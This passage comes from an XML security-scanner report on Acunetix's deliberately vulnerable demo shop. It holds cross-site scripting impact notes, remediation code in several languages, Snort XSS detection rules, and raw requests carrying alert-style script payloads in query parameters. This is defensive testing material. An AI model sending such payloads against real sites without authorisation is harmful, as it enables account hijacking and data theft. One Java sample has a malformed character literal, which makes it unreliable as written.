</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="0A3D0E908BB3E03D782B3122BF905B16"><![CDATA[GET /listproducts.php?cat=%3csCrIpT%3ealert(27728)%3c%2fsCrIpT%3e HTTP/1.1
Referer: http://php.vulnweb.com/categories.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="0A3D0E908BB3E03D782B3122BF905B16";PSID="F7D951246A36A7EA95380E5645528F36";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="29";AttackParamDesc="cat";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2532%2537%2537%2532%2538%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="43";tt="40";
X-RequestManager-Memo: sid="35";smi="0";sc="1";ID="b9016a87";
X-Request-Memo: ID="7646835d";sc="1";tid="43";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:48:20 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5005

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<sCrIpT>alert(27728)</sCrIpT>' at line 1
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="0A3D0E908BB3E03D782B3122BF905B16"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>cat=%3csCrIpT%3ealert(27728)%3c%2fsCrIpT%3e</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>cat</Name><Value>%3csCrIpT%3ealert(27728)%3c%2fsCrIpT%3e</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/categories.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="0A3D0E908BB3E03D782B3122BF905B16";PSID="F7D951246A36A7EA95380E5645528F36";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="29";AttackParamDesc="cat";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2532%2537%2537%2532%2538%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="43";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="35";smi="0";sc="1";ID="b9016a87";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="7646835d";sc="1";tid="43";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<sCrIpT>alert(27728)</sCrIpT>' at line 1
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:48:20 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5005</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="AB36F37D0A625B14AD80D876FD4297C7"><URL>http://php.vulnweb.com:80/listproducts.php?artist=%3csCrIpT%3ealert(42217)%3c%2fsCrIpT%3e</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>artist</AttackParamDescriptor><Issues><Issue id="bd9c4a89-84c6-4f00-8c37-8d721c528d61"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /listproducts.php?artist=%3csCrIpT%3ealert(42217)%3c%2fsCrIpT%3e HTTP/1.1
Referer: http://php.vulnweb.com/artists.php?artist=1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
